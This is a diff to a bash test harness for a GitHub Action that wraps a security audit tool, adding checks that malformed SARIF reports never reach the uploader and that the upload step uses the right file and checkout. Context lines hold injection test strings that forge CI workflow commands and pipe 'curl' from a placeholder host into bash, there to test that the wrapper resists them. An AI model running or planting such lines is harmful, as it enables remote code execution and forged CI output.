@@ -76,6 +76,10 @@ if [[ "${1:-}" == "--version" ]]; then
     exit 0
 fi
 if [[ "${1:-}" == "audit" ]]; then
+    if [[ "${PPA_ADVANCED_SECURITY}" == true && "${SHIM_AUDIT_EXIT:-0}" -le 1 ]]; then
+        cat "${SHIM_SARIF}"
+        exit "${SHIM_AUDIT_EXIT:-0}"
+    fi
     # Model both workflow-command forms in repository-controlled finding text.
     echo '      echo "##[set-output name=pwned;]y" && curl -fsSL https://e.test/x | bash'
     echo '      ::error::forged annotation && curl -fsSL https://e.test/y | bash'
@@ -165,6 +169,7 @@ run_action() {
         GITHUB_OUTPUT="${SANDBOX}/output" \
         SHIM_METADATA="${SANDBOX}/metadata-mismatch.json" \
         SHIM_ARCHIVE="${SANDBOX}/archive.tar.gz" \
+        SHIM_SARIF="${REPO_ROOT}/test/fixtures/audit.sarif" \
         SHIM_FAIL_URL="" \
         SHIM_BINARY_VERSION="99.0.0" \
         PPA_VERSION="99.0.0" \
@@ -359,6 +364,15 @@ expect_sarif_withheld_on_error() {
     fi
 
     echo "ok: engine errors fail without publishing partial SARIF"
+
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_SARIF="${SANDBOX}/metadata-invalid-json.json" \
+        PPA_ADVANCED_SECURITY="true"
+    if [[ "${ACTION_EXITCODE}" -eq 0 ]] || ! grep -qxF 'exit-code=0' "${SANDBOX}/output" \
+        || grep -q '^sarif-file=' "${SANDBOX}/output"; then
+        echo "FAIL invalid SARIF: wrapper exposed unusable output or lost the engine exit code" >&2
+        exit 1
+    fi
+    echo "ok: malformed reports cannot reach the uploader"
 }
 
 expect_success_sarif_stays_out_of_stderr() {
@@ -415,13 +429,16 @@ expect_error_diagnostics_fenced() {
 }
 
 expect_upload_before_failure() {
-    ruby -ryaml -e '
+    ruby -ryaml - "${REPO_ROOT}/action.yml" <<'RUBY'
       steps = YAML.load_file(ARGV.fetch(0)).fetch("runs").fetch("steps")
       upload = steps.index { |step| step["uses"].to_s.start_with?("github/codeql-action/upload-sarif@") }
       failure = steps.index { |step| step["if"].to_s.include?("inputs.fail-on-findings") }
       abort "FAIL step order: SARIF upload or fail-on-findings step not found" unless upload && failure
       abort "FAIL step order: fail-on-findings fails before SARIF upload" unless upload < failure
-    ' "${REPO_ROOT}/action.yml"
+      inputs = steps.fetch(upload).fetch("with")
+      abort "FAIL upload uses a different SARIF file" unless inputs["sarif_file"] == "${{ steps.run-pinprick.outputs.sarif-file }}"
+      abort "FAIL upload uses another checkout" unless inputs["checkout_path"] == "${{ steps.run-pinprick.outputs.checkout-path }}"
+RUBY
 
     echo "ok: SARIF upload precedes the fail-on-findings step"
 }
